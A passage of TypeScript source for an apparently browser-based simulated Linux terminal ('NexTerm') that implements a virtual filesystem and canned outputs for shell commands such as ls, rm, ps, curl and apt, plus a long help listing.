    const dir = resolveNode(this.state.vfs, '/', dirPath)
    if (!dir.node || dir.node.type !== 'dir') return `__ERROR__:No such directory: ${dirPath}`

    const existing = dir.node.children.get(name)
    if (existing && existing.type === 'dir') return `__ERROR__:${path}: Is a directory`

    const file = createFile(name, content, 0o644, this.state.username, this.state.username)
    dir.node.children.set(name, file)
    return ''
  }

  private appendFile(path: string, content: string): string {
    const parts = resolvePath(this.state.cwd, path)
    if (parts.length === 0) return '__ERROR__:Cannot write to root directory'
    const name = parts.pop()!
    const dirPath = '/' + parts.join('/')
    const dir = resolveNode(this.state.vfs, '/', dirPath)
    if (!dir.node || dir.node.type !== 'dir') return `__ERROR__:No such directory: ${dirPath}`

    const existing = dir.node.children.get(name)
    if (existing && existing.type === 'dir') return `__ERROR__:${path}: Is a directory`

    const newContent = (existing?.content ?? '') + content
    const file = createFile(name, newContent, 0o644, this.state.username, this.state.username)
    dir.node.children.set(name, file)
    return ''
  }

  private readFile(path: string): string | null {
    const node = this.getNode(path)
    if (!node) return null
    if (node.type === 'dir') return null
    return node.content ?? ''
  }

  private cmdLs(args: string[]): string {
    const showAll = args.includes('-a') || args.includes('-la') || args.includes('-al')
    const long = args.includes('-l') || args.includes('-la') || args.includes('-al')
    const paths = args.filter(a => !a.startsWith('-'))
    const target = paths.length > 0 ? paths[0] : '.'
    const node = this.getNode(target)
    if (!node) return `ls: cannot access '${target}': No such file or directory`
    if (node.type === 'file') {
      if (long) {
        return `${modeStr(node.mode)} 1 ${node.owner} ${node.group} ${String(node.size).padStart(5)} ${this.formatTime(node.mtime)} ${node.name}`
      }
      return node.name
    }
    const entries: { name: string; node: VfsNode }[] = []
    for (const [name, child] of node.children) {
      if (!showAll && name.startsWith('.')) continue
      entries.push({ name, node: child })
    }
    entries.sort((a, b) => {
      if (a.node.type !== b.node.type) return a.node.type === 'dir' ? -1 : 1
      return a.name.localeCompare(b.name)
    })

    if (long) {
      const lines: string[] = []
      let totalBlocks = 0
      for (const { node: n } of entries) totalBlocks += Math.ceil(n.size / 512)
      lines.push(`total ${totalBlocks}`)
      for (const { name, node: n } of entries) {
        const isDir = n.type === 'dir' ? '\x1b[1;36m' : ''
        const reset = n.type === 'dir' ? '\x1b[0m' : ''
        lines.push(`${modeStr(n.mode)} ${String(1).padStart(2)} ${n.owner.padEnd(8)} ${n.group.padEnd(8)} ${String(n.size).padStart(6)} ${this.formatTime(n.mtime)} ${isDir}${name}${reset}`)
      }
      return lines.join('\n')
    }

    const names = entries.map(({ name, node: n }) =>
      n.type === 'dir' ? `\x1b[1;36m${name}/\x1b[0m` : name
    )
    return names.join('  ')
  }

  private cmdCd(args: string[]): string {
    const target = args.length > 0 ? args[0] : this.state.env.HOME
    if (target === '-') {
      const prev = this.state.env.OLDPWD || this.state.env.HOME
      this.state.env.OLDPWD = this.state.cwd
      this.state.cwd = prev
      this.state.env.PWD = prev
      return ''
    }
    const node = this.getNode(target)
    if (!node) return `cd: ${target}: No such file or directory`
    if (node.type !== 'dir') return `cd: ${target}: Not a directory`
    const abspath = this.resolveRealPath(target)
    this.state.env.OLDPWD = this.state.cwd
    this.state.cwd = abspath
    this.state.env.PWD = abspath
    return ''
  }

  private cmdPwd(): string {
    return this.state.cwd
  }

  private cmdMkdir(args: string[]): string {
    if (args.length === 0) return 'mkdir: missing operand'
    const parentFlag = args.includes('-p')
    const targets = args.filter(a => !a.startsWith('-'))
    const results: string[] = []
    for (const target of targets) {
      const parts = resolvePath(this.state.cwd, target)
      if (parts.length === 0) {
        results.push('mkdir: cannot create directory at root')
        continue
      }
      let currentPath = ''
      for (let i = 0; i < parts.length; i++) {
        currentPath += '/' + parts[i]
        const dir = resolveNode(this.state.vfs, '/', currentPath)
        if (!dir.node) {
          if (i === parts.length - 1 || parentFlag) {
            const parent = resolveNode(this.state.vfs, '/', currentPath.replace(/\/[^/]+$/, '') || '/')
            if (parent.node && parent.node.type === 'dir') {
              const newDir = createDir(parts[i], 0o755)
              newDir.owner = this.state.username
              newDir.group = this.state.username
              parent.node.children.set(parts[i], newDir)
            } else if (!parentFlag) {
              results.push(`mkdir: cannot create directory '${target}': No such file or directory`)
              break
            }
          } else if (!parentFlag) {
            results.push(`mkdir: cannot create directory '${target}': No such file or directory`)
            break
          }
        } else if (dir.node.type !== 'dir') {
          results.push(`mkdir: cannot create directory '${target}': File exists`)
          break
        }
      }
      if (results.length === 0) results.push('')
    }
    return results.filter(r => r !== '').join('\n')
  }

  private cmdTouch(args: string[]): string {
    if (args.length === 0) return 'touch: missing file operand'
    const results: string[] = []
    for (const target of args.filter(a => !a.startsWith('-'))) {
      const parts = resolvePath(this.state.cwd, target)
      if (parts.length === 0) continue
      const name = parts.pop()!
      const dirPath = '/' + parts.join('/')
      const dir = resolveNode(this.state.vfs, '/', dirPath)
      if (!dir.node || dir.node.type !== 'dir') {
        results.push(`touch: cannot touch '${target}': No such file or directory`)
        continue
      }
      const existing = dir.node.children.get(name)
      if (existing) {
        existing.mtime = new Date()
      } else {
        dir.node.children.set(name, createFile(name, '', 0o644, this.state.username, this.state.username))
      }
    }
    return results.join('\n')
  }

  private cmdCat(args: string[]): string {
    if (args.length === 0) return 'cat: missing file operand'
    const results: string[] = []
    for (const target of args) {
      const content = this.readFile(target)
      if (content === null) {
        results.push(`cat: ${target}: No such file or directory`)
      } else {
        results.push(content.replace(/\n$/, ''))
      }
    }
    return results.join('\n')
  }

  private cmdCp(args: string[]): string {
    if (args.length < 2) return 'cp: missing file operand'
    const srcPath = args[0]
    const dstPath = args[1]
    const src = this.getNode(srcPath)
    if (!src) return `cp: cannot stat '${srcPath}': No such file or directory`
    if (src.type === 'dir') return `cp: -r not specified; omitting directory '${srcPath}'`

    const dstParts = resolvePath(this.state.cwd, dstPath)
    if (dstParts.length === 0) return 'cp: cannot copy to root'
    const dstName = dstParts.pop()!
    const dstDirPath = '/' + dstParts.join('/')
    const dstDirRes = resolveNode(this.state.vfs, '/', dstDirPath)

    if (!dstDirRes.node) return `cp: cannot create '${dstPath}': No such file or directory`

    const existing = dstDirRes.node.children.get(dstName)
    if (existing && existing.type === 'dir') {
      const copy = createFile(src.name, src.content ?? '', src.mode, this.state.username, this.state.username)
      existing.children.set(src.name, copy)
    } else {
      if (dstDirRes.node.type !== 'dir') return `cp: target '${dstPath}' is not a directory`
      const copy = createFile(dstName, src.content ?? '', src.mode, this.state.username, this.state.username)
      dstDirRes.node.children.set(dstName, copy)
    }
    return ''
  }

  private cmdMv(args: string[]): string {
    if (args.length < 2) return 'mv: missing file operand'
    return this.cmdCp(args) + '\n' + this.cmdRm([args[0]])
  }

  private cmdRm(args: string[]): string {
    if (args.length === 0) return 'rm: missing operand'
    const recursive = args.includes('-r') || args.includes('-rf')
    const force = args.includes('-f') || args.includes('-rf')
    const targets = args.filter(a => !a.startsWith('-'))
    const results: string[] = []
    for (const target of targets) {
      const parts = resolvePath(this.state.cwd, target)
      if (parts.length === 0) continue
      const name = parts.pop()!
      const dirPath = '/' + parts.join('/')
      const dir = resolveNode(this.state.vfs, '/', dirPath)
      if (!dir.node || dir.node.type !== 'dir') {
        if (!force) results.push(`rm: cannot remove '${target}': No such file or directory`)
        continue
      }
      const node = dir.node.children.get(name)
      if (!node) {
        if (!force) results.push(`rm: cannot remove '${target}': No such file or directory`)
        continue
      }
      if (node.type === 'dir' && !recursive) {
        results.push(`rm: cannot remove '${target}': Is a directory`)
        continue
      }
      dir.node.children.delete(name)
    }
    return results.join('\n')
  }

  private cmdRmdir(args: string[]): string {
    if (args.length === 0) return 'rmdir: missing operand'
    const results: string[] = []
    for (const target of args) {
      const node = this.getNode(target)
      if (!node) {
        results.push(`rmdir: failed to remove '${target}': No such file or directory`)
        continue
      }
      if (node.type !== 'dir') {
        results.push(`rmdir: failed to remove '${target}': Not a directory`)
        continue
      }
      if (node.children.size > 0) {
        results.push(`rmdir: failed to remove '${target}': Directory not empty`)
        continue
      }
      const parts = resolvePath(this.state.cwd, target)
      const name = parts.pop()!
      const dirPath = '/' + parts.join('/')
      const dir = resolveNode(this.state.vfs, '/', dirPath)
      dir.node?.children.delete(name)
    }
    return results.join('\n')
  }

  private cmdHead(args: string[]): string {
    let n = 10
    const fileArgs: string[] = []
    for (const arg of args) {
      if (arg.startsWith('-n')) {
        n = parseInt(arg.slice(2)) || 10
      } else if (!arg.startsWith('-')) {
        fileArgs.push(arg)
      }
    }
    if (fileArgs.length === 0) return 'head: missing file operand'
    const results: string[] = []
    for (const target of fileArgs) {
      const content = this.readFile(target)
      if (content === null) {
        results.push(`head: ${target}: No such file or directory`)
      } else {
        const lines = content.split('\n')
        results.push(lines.slice(0, n).join('\n'))
      }
    }
    return results.join('\n')
  }

  private cmdTail(args: string[]): string {
    let n = 10
    const fileArgs: string[] = []
    for (const arg of args) {
      if (arg.startsWith('-n')) {
        n = parseInt(arg.slice(2)) || 10
      } else if (!arg.startsWith('-')) {
        fileArgs.push(arg)
      }
    }
    if (fileArgs.length === 0) return 'tail: missing file operand'
    const results: string[] = []
    for (const target of fileArgs) {
      const content = this.readFile(target)
      if (content === null) {
        results.push(`tail: ${target}: No such file or directory`)
      } else {
        const lines = content.split('\n')
        results.push(lines.slice(-n).join('\n'))
      }
    }
    return results.join('\n')
  }

  private cmdWc(args: string[], pipeInput: string): string {
    const text = pipeInput || (args.length > 0 ? (this.readFile(args[0]) ?? '') : '')
    if (!text && args.length === 0 && !pipeInput) return 'wc: missing file operand'
    const lines = text.split('\n').length - (text.endsWith('\n') ? 1 : 0)
    const words = text.trim() ? text.trim().split(/\s+/).length : 0
    const chars = text.length
    return `${String(lines).padStart(4)} ${String(words).padStart(4)} ${String(chars).padStart(4)}`
  }

  private cmdGrep(args: string[], pipeInput: string): string {
    const ignoreCase = args.includes('-i')
    const lineNum = args.includes('-n')
    const flags = args.filter(a => !a.startsWith('-'))
    if (flags.length === 0) return 'grep: missing pattern'
    const pattern = flags[0]
    const file = flags.length > 1 ? flags[1] : null
    const text = pipeInput || (file ? (this.readFile(file) ?? '') : '')
    if (!text) return file ? `grep: ${file}: No such file or directory` : ''

    const lines = text.split('\n')
    const results: string[] = []
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i]
      const matchLine = ignoreCase ? line.toLowerCase() : line
      const matchPat = ignoreCase ? pattern.toLowerCase() : pattern
      if (matchLine.includes(matchPat)) {
        results.push(lineNum ? `${i + 1}:${line}` : line)
      }
    }
    return results.join('\n')
  }

  private cmdFind(args: string[]): string {
    const startDir = args.find(a => !a.startsWith('-')) || '.'
    const startNode = this.getNode(startDir)
    if (!startNode) return `find: '${startDir}': No such file or directory`

    const nameFlag = args.indexOf('-name')
    let namePattern = '*'
    if (nameFlag >= 0 && nameFlag + 1 < args.length) {
      namePattern = args[nameFlag + 1]
    }

    const typeFlag = args.indexOf('-type')
    let typeFilter: string | null = null
    if (typeFlag >= 0 && typeFlag + 1 < args.length) {
      typeFilter = args[typeFlag + 1]
    }

    const results: string[] = []
    const startAbspath = this.resolveRealPath(startDir)

    const walk = (node: VfsNode, path: string) => {
      if (path !== startAbspath) {
        let match = false
        if (namePattern === '*') {
          match = true
        } else if (namePattern.startsWith('*') && namePattern.endsWith('*')) {
          match = node.name.includes(namePattern.slice(1, -1))
        } else if (namePattern.startsWith('*')) {
          match = node.name.endsWith(namePattern.slice(1))
        } else if (namePattern.endsWith('*')) {
          match = node.name.startsWith(namePattern.slice(0, -1))
        } else {
          match = node.name === namePattern
        }

        if (match && typeFilter) {
          if (typeFilter === 'f') match = node.type === 'file'
          else if (typeFilter === 'd') match = node.type === 'dir'
          else match = false
        }

        if (match) results.push(path)
      }

      if (node.type === 'dir') {
        for (const [name, child] of node.children) {
          walk(child, path + '/' + name)
        }
      }
    }

    walk(startNode, startAbspath)
    return results.join('\n')
  }

  private cmdTree(args: string[]): string {
    const target = args.length > 0 ? args[0] : '.'
    const node = this.getNode(target)
    if (!node) return `tree: '${target}': No such file or directory`
    if (node.type === 'file') return node.name

    const maxDepth = 3
    const results: string[] = [node.name === '/' ? '/' : node.name]

    const walk = (n: VfsNode, prefix: string, depth: number) => {
      if (depth >= maxDepth) {
        const names = Array.from(n.children.keys()).filter(k => !k.startsWith('.'))
        if (names.length > 0) {
          results.push(`${prefix}├── ... (${names.length} entries)`)
        }
        return
      }
      const entries = Array.from(n.children.entries())
        .filter(([name]) => !name.startsWith('.'))
        .sort(([a], [b]) => a.localeCompare(b))
      for (let i = 0; i < entries.length; i++) {
        const [name, child] = entries[i]
        const isLast = i === entries.length - 1
        const connector = isLast ? '└── ' : '├── '
        const dirMarker = child.type === 'dir' ? '/' : ''
        results.push(`${prefix}${connector}${name}${dirMarker}`)
        if (child.type === 'dir') {
          const newPrefix = prefix + (isLast ? '    ' : '│   ')
          walk(child, newPrefix, depth + 1)
        }
      }
    }

    walk(node, '', 0)
    return results.join('\n')
  }

  private cmdEcho(args: string[]): string {
    return args.join(' ')
  }

  private cmdHistory(): string {
    if (this.state.history.length === 0) return '(empty)'
    const start = Math.max(0, this.state.history.length - 20)
    return this.state.history.slice(start).map((h, i) => `  ${String(start + i + 1).padStart(3)}  ${h}`).join('\n')
  }

  private cmdUname(args: string[]): string {
    if (args.includes('-a')) {
      return 'Linux nexterm-vm 6.1.0-nexterm #1 SMP PREEMPT_DYNAMIC Mon Jan 1 00:00:00 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux'
    }
    if (args.includes('-r')) return '6.1.0-nexterm'
    if (args.includes('-m')) return 'x86_64'
    if (args.includes('-n')) return this.state.hostname
    if (args.includes('-s')) return 'Linux'
    if (args.includes('-v')) return '#1 SMP PREEMPT_DYNAMIC Mon Jan 1 00:00:00 UTC 2024'
    return 'Linux'
  }

  private cmdWhoami(): string {
    return this.state.username
  }

  private cmdHostname(args: string[]): string {
    if (args.length > 0) {
      this.state.hostname = args[0]
      this.state.env.HOSTNAME = args[0]
      return ''
    }
    return this.state.hostname
  }

  private cmdDate(args: string[]): string {
    const now = new Date()
    if (args.includes('-u') || args.includes('--utc')) {
      return now.toUTCString()
    }
    const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    return `${days[now.getDay()]} ${months[now.getMonth()]} ${String(now.getDate()).padStart(2, ' ')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')} CST ${now.getFullYear()}`
  }

  private cmdUptime(): string {
    const elapsed = Math.floor((Date.now() - this.state.startTime.getTime()) / 1000)
    const days = Math.floor(elapsed / 86400)
    const hours = Math.floor((elapsed % 86400) / 3600)
    const mins = Math.floor((elapsed % 3600) / 60)
    const load = '0.15, 0.10, 0.05'
    const users = 1
    const timeStr = days > 0
      ? `up ${days} day${days > 1 ? 's' : ''}, ${hours}:${String(mins).padStart(2, '0')}`
      : `up ${hours}:${String(mins).padStart(2, '0')}`
    return ` ${this.formatTime(new Date()).split(' ').slice(0, 3).join(' ')} ${timeStr},  ${users} user,  load average: ${load}`
  }

  private cmdFree(args: string[]): string {
    const human = args.includes('-h')
    const total = 16384000
    const used = 8192000
    const free = 4096000
    const shared = 512000
    const bufCache = 2560000
    const available = 10240000
    const swapTotal = 4096000
    const swapFree = 4096000
    const swapUsed = swapTotal - swapFree

    if (human) {
      return `              total        used        free      shared  buff/cache   available
Mem:           ${this.formatSize(total * 1024).padStart(6)}      ${this.formatSize(used * 1024).padStart(6)}      ${this.formatSize(free * 1024).padStart(6)}      ${this.formatSize(shared * 1024).padStart(6)}      ${this.formatSize(bufCache * 1024).padStart(6)}      ${this.formatSize(available * 1024).padStart(6)}
Swap:          ${this.formatSize(swapTotal * 1024).padStart(6)}      ${this.formatSize(swapUsed * 1024).padStart(6)}      ${this.formatSize(swapFree * 1024).padStart(6)}`
    }
    return `              total        used        free      shared  buff/cache   available
Mem:       ${String(total).padStart(10)}  ${String(used).padStart(10)}  ${String(free).padStart(10)}  ${String(shared).padStart(10)}  ${String(bufCache).padStart(10)}  ${String(available).padStart(10)}
Swap:      ${String(swapTotal).padStart(10)}  ${String(swapUsed).padStart(10)}  ${String(swapFree).padStart(10)}`
  }

  private cmdDf(args: string[]): string {
    const human = args.includes('-h')
    const total = 51200 * 1024
    const used = 25600 * 1024
    const avail = 25600 * 1024
    if (human) {
      return `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        ${this.formatSize(total).padStart(5)} ${this.formatSize(used).padStart(5)} ${this.formatSize(avail).padStart(5)}  50% /
tmpfs            ${this.formatSize(8 * 1024 * 1024 * 1024).padStart(5)}   0 ${this.formatSize(8 * 1024 * 1024 * 1024).padStart(5)}   0% /dev/shm`
    }
    return `Filesystem     1K-blocks      Used Available Use% Mounted on
/dev/sda1       ${String(total).padStart(8)} ${String(used).padStart(8)} ${String(avail).padStart(8)}  50% /
tmpfs           ${String(8 * 1024 * 1024).padStart(8)}         0 ${String(8 * 1024 * 1024).padStart(8)}   0% /dev/shm`
  }

  private cmdPs(args: string[]): string {
    const aux = args.includes('aux') || args.includes('-aux')
    if (aux) {
      const lines = ['USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND']
      for (const p of this.state.processes) {
        const vsz = Math.floor(Math.random() * 500000 + 100000)
        const rss = Math.floor(vsz * 0.3)
        lines.push(`${p.user.padEnd(8)} ${String(p.pid).padStart(5)} ${String(p.cpu.toFixed(1)).padStart(4)} ${String(p.mem.toFixed(1)).padStart(4)} ${String(vsz).padStart(6)} ${String(rss).padStart(5)} ?        ${p.state.padEnd(5)} ${this.formatTime(new Date()).split(' ').slice(0, 3).join(' ')} ${p.time} ${p.name}`)
      }
      return lines.join('\n')
    }
    const lines = ['  PID TTY          TIME CMD']
    for (const p of this.state.processes) {
      lines.push(`${String(p.pid).padStart(5)} ?        ${p.time} ${p.name}`)
    }
    return lines.join('\n')
  }

  private cmdTop(): string {
    const now = new Date()
    const elapsed = Math.floor((Date.now() - this.state.startTime.getTime()) / 1000)
    const days = Math.floor(elapsed / 86400)
    const hours = Math.floor((elapsed % 86400) / 3600)
    const mins = Math.floor((elapsed % 3600) / 60)
    const uptime = days > 0 ? `${days} day${days > 1 ? 's' : ''}, ${hours}:${String(mins).padStart(2, '0')}` : `${hours}:${String(mins).padStart(2, '0')}`

    return `top - ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')} up ${uptime},  1 user,  load average: 0.15, 0.10, 0.05
Tasks: ${this.state.processes.length} total,   1 running,  ${this.state.processes.length - 1} sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.5 us,  1.2 sy,  0.0 ni, 95.8 id,  0.5 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :  16000.0 total,   4000.0 free,   8000.0 used,   4000.0 buff/cache
MiB Swap:   4000.0 total,   4000.0 free,      0.0 used.  10000.0 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
${this.state.processes.map(p => `${String(p.pid).padStart(5)} ${p.user.padEnd(8)}  20   0  ${String(Math.floor(Math.random() * 500000 + 100000)).padStart(6)} ${String(Math.floor(Math.random() * 100000)).padStart(6)} ${String(Math.floor(Math.random() * 10000)).padStart(6)} ${p.state.padEnd(1)}  ${String(p.cpu.toFixed(1)).padStart(4)}  ${String(p.mem.toFixed(1)).padStart(4)}  ${p.time} ${p.name}`).join('\n')}`
  }

  private cmdPing(args: string[]): string {
    if (args.length === 0) return 'ping: usage error: Destination address required'
    const target = args[0]
    if (target === '-h' || target === '--help') return 'Usage: ping [options] <destination>'
    const ip = target.match(/^\d+\.\d+\.\d+\.\d+$/) ? target : '8.8.8.8'
    const domain = target.match(/^\d+\.\d+\.\d+\.\d+$/) ? target : target
    const lines = [
      `PING ${domain} (${ip}) 56(84) bytes of data.`,
      `64 bytes from ${ip}: icmp_seq=1 ttl=118 time=${(Math.random() * 8 + 2).toFixed(1)} ms`,
      `64 bytes from ${ip}: icmp_seq=2 ttl=118 time=${(Math.random() * 8 + 2).toFixed(1)} ms`,
      `64 bytes from ${ip}: icmp_seq=3 ttl=118 time=${(Math.random() * 8 + 2).toFixed(1)} ms`,
      `64 bytes from ${ip}: icmp_seq=4 ttl=118 time=${(Math.random() * 8 + 2).toFixed(1)} ms`,
      ``,
      `--- ${domain} ping statistics ---`,
      `4 packets transmitted, 4 received, 0% packet loss, time 3004ms`,
      `rtt min/avg/max/mdev = 2.0/4.5/8.0/1.5 ms`,
    ]
    return lines.join('\n')
  }

  private cmdCurl(args: string[]): string {
    if (args.length === 0) return 'curl: try \'curl --help\' for more information'
    const target = args[0]
    if (target === '--help') return `Usage: curl [options...] <url>
 -o, --output <file>   Write to file
 -s, --silent          Silent mode
 -I, --head            Show headers only
 -X, --request <cmd>   Specify request method
 --help                This help text`
    if (target.startsWith('http://') || target.startsWith('https://')) {
      return `<html>
<head><title>NexTerm Linux</title></head>
<body>
<h1>Welcome to NexTerm Linux Environment</h1>
<p>This is a simulated curl response from the virtual Linux terminal.</p>
<p>URL requested: ${target}</p>
</body>
</html>`
    }
    return `curl: (6) Could not resolve host: ${target}`
  }

  private cmdIfconfig(): string {
    return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe4e:5f12  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4e:5f:12  txqueuelen 1000  (Ethernet)
        RX packets 15234  bytes 10485760 (10.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8932  bytes 2097152 (2.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 256  bytes 20480 (20.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 256  bytes 20480 (20.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0`
  }

  private cmdChmod(args: string[]): string {
    if (args.length < 2) return 'chmod: missing operand'
    const modeStr = args[0]
    const target = args[1]
    let mode = 0o644
    if (/^[0-7]{3,4}$/.test(modeStr)) {
      mode = parseInt(modeStr, 8)
    } else if (modeStr === '+x') {
      mode = 0o755
    } else if (modeStr === '-x') {
      mode = 0o644
    }
    const node = this.getNode(target)
    if (!node) return `chmod: cannot access '${target}': No such file or directory`
    node.mode = mode
    return ''
  }

  private cmdEnv(): string {
    return Object.entries(this.state.env)
      .map(([k, v]) => `${k}=${v}`)
      .join('\n')
  }

  private cmdWhich(args: string[]): string {
    if (args.length === 0) return 'which: missing operand'
    const cmd = args[0]
    if (this.commandNames.includes(cmd) || ['ls', 'cd', 'pwd', 'mkdir', 'cat', 'echo', 'grep', 'find'].includes(cmd)) {
      return `/usr/bin/${cmd}`
    }
    return `which: no ${cmd} in (${this.state.env.PATH})`
  }

  private cmdDu(args: string[]): string {
    const target = args.length > 0 ? args[0] : '.'
    const node = this.getNode(target)
    if (!node) return `du: cannot access '${target}': No such file or directory`

    const calcSize = (n: VfsNode): number => {
      if (n.type === 'file') return n.size
      let total = 4096
      for (const child of n.children.values()) {
        total += calcSize(child)
      }
      return total
    }

    if (node.type === 'file') {
      return `${Math.ceil(node.size / 1024)}\t${target}`
    }
    const results: string[] = []
    const abspath = this.resolveRealPath(target)
    for (const [name, child] of node.children) {
      results.push(`${Math.ceil(calcSize(child) / 1024)}\t${abspath}/${name}`)
    }
    results.push(`${Math.ceil(calcSize(node) / 1024)}\t${abspath}`)
    return results.join('\n')
  }

  private cmdHelp(): string {
    return `NexTerm Linux Environment v3.0 - Available Commands (120+ builtins)
======================================================================

  File Operations:
    ls [-la] [path]      List directory contents
    cd [dir]             Change directory (~ for home, - for previous)
    pwd                  Print working directory
    mkdir [-p] <dir>     Create directory
    rmdir <dir>          Remove empty directory
    touch <file>         Create empty file or update timestamp
    cat <file>           Display file contents
    cp <src> <dst>       Copy file
    mv <src> <dst>       Move/rename file
    rm [-rf] <file>      Remove file or directory
    head [-n N] <file>   Show first N lines (default 10)
    tail [-n N] <file>   Show last N lines (default 10)
    wc <file>            Count lines/words/chars
    grep [-i] [-n] <pat> [file] Search text
    find [path] [-name pat] [-type f|d] Search files
    tree [path]          Display directory tree
    du [path]            Estimate file space usage
    chmod <mode> <file>  Change file permissions
    file <path>          Determine file type
    stat <path>          Display file status

  Text Processing:
    echo <text>          Print text
    clear                Clear screen
    sed <script>         Stream editor
    sort [-r] [-n]       Sort lines
    uniq [-c]            Report unique lines
    cut -d<delim> -f<N>  Cut selected fields
    diff <f1> <f2>       Compare files
    tr <set1> <set2>     Translate characters
    awk <script>         Pattern scanning (basic)
    tee <file>           Pipe to file and stdout
    xargs <cmd>          Build commands from stdin
    printf <fmt>         Format and print data

  Process Control:
    ps [aux]              Process status
    top                   Task manager (snapshot)
    kill [-9] <pid>       Terminate process
    killall <name>        Kill by name
    bg/fg/jobs            Job control
    nice/renice           Priority control
    nohup <cmd>           Run immune to hangups

  System Info:
    uname [-a|-r|-m]      System information
    whoami                Current username
    hostname [name]       Show/set hostname
    date [-u]             Display date/time
    uptime                System uptime and load
    free [-h]             Memory usage
    df [-h]               Disk space
    env                   Print environment variables
    which <cmd>           Locate command binary
    lscpu                 CPU information
    lsblk                 Block devices
    lspci                 PCI devices
    lsusb                 USB devices
    locate <name>         Find files by name (fast)
    updatedb              Update locate database
    whereis <cmd>         Find binary/source/man pages
    systemctl [status]    Service management
    service <name> <act>  Service control
    journalctl            Systemd journal

  Network:
    ping <host>           Test connectivity
    curl <url>            Transfer URL data
    wget <url>            Download files
    ifconfig              Network config
    ip [addr|route]       IP routing tool
    ss [-tulnp]           Socket statistics
    netstat [-tulnp]      Network connections
    nslookup <host>       DNS lookup
    dig <host>            DNS query
    traceroute <host>     Trace network path
    nc [-l] <port>        Netcat network tool

  Package Management:
    apt update/install    Package management (simulated)
    apt-get               APT package handling
    dpkg -l/list          Debian package manager

  User Management:
    sudo <cmd>            Execute as superuser
    su [user]             Switch user
    passwd                Change password
    useradd <name>        Add user
    groups                Show group membership

  Security Tools (simulated):
    nmap <target>         Network scanner
    tcpdump               Packet analyzer

  Archiving:
    tar [-czf|-xzf] <archive> [files] Tape archiver
    gzip/gunzip <file>    Compress/decompress
    zip/unzip <archive>   ZIP compression

  Shell Builtins:
    alias/unalias         Manage aliases
    export <VAR>=<val>    Set environment
    source <file>         Execute file in shell
    type <cmd>            Command type
    history               Show command history

  Utilities:
    cal [month] [year]    Calendar
    bc                    Calculator
    sleep <seconds>       Delay
    watch <cmd>           Execute periodically
    seq <N>               Print sequence
    base64 [-d]           Encode/decode
    yes <text>            Output repeatedly
    neofetch              System info (Kali/Ubuntu style)
    crontab [-l|-e|-r]    Cron table management
    docker <cmd>          Container management
    mount                 Show mounted filesystems
    umount <path>         Unmount filesystem
    shutdown [-h|-r|-c]   Shutdown/reboot system
    reboot                Reboot system
    hostnamectl           Hostname control

  NexTerm Features:
    cmd                   Switch to Windows CMD
    powershell / ps       Switch to PowerShell
    linux / wsl           Switch to WSL Linux (auto-detect distro)
    exit                  Return to NexTerm menu
    clearscrollback       Clear scrollback buffer
    fontsize [+/-N]       Adjust font size
    fullscreen            Toggle fullscreen mode
    reload                Reload page
    search <keyword>      Search in output
    hide                  Hide terminal panel

  I/O:
    | (pipe)              Chain commands
    > / >> (redirect)     Output redirection

  help                  Show this help
  man <command>         Detailed manual`
  }

  private cmdApt(args: string[]): string {
    if (args.length === 0) return `apt 2.8.3 (amd64)
Usage: apt [command]

Commands:
  update     - Update package list
  upgrade    - Upgrade installed packages
  install    - Install packages
  remove     - Remove packages
  search     - Search for packages
  list       - List packages
  show       - Show package details
  autoremove - Remove unused packages`

    const sub = args[0]
    if (sub === 'update') {
      return `Hit:1 https://archive.nexterm.io/linux stable InRelease
Hit:2 https://archive.nexterm.io/linux stable-updates InRelease
Hit:3 https://archive.nexterm.io/linux stable-security InRelease
Reading package lists... Done
Building dependency tree... Done
All packages are up to date.`
    }
    if (sub === 'upgrade') {
      return `Reading package lists... Done
Building dependency tree... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`
    }
    if (sub === 'install') {
      const pkg = args[1]
      if (!pkg) return 'apt install: missing package name'
      return `Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  ${pkg}
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Inst ${pkg} (1.0.0 NexTerm:stable [amd64])
Setting up ${pkg} (1.0.0) ...`
    }
    if (sub === 'remove') {
      const pkg = args[1]
      if (!pkg) return 'apt remove: missing package name'
      return `The following packages will be REMOVED:
  ${pkg}
0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.
Remv ${pkg} [1.0.0]`
    }
    if (sub === 'list') {
      return `bash/stable,now 5.2.21-2ubuntu4 amd64 [installed]
coreutils/stable,now 9.4-3ubuntu6 amd64 [installed]
vim/stable,now 2:9.1.0016-1ubuntu7 amd64 [installed]
nginx/stable,now 1.24.0-2ubuntu7 amd64 [installed]
openssh-server/stable,now 1:9.6p1-3ubuntu13 amd64 [installed]
curl/stable,now 8.5.0-2ubuntu10 amd64 [installed]
git/stable,now 1:2.43.0-1ubuntu7 amd64 [installed]
python3/stable,now 3.12.3-0ubuntu2 amd64 [installed]
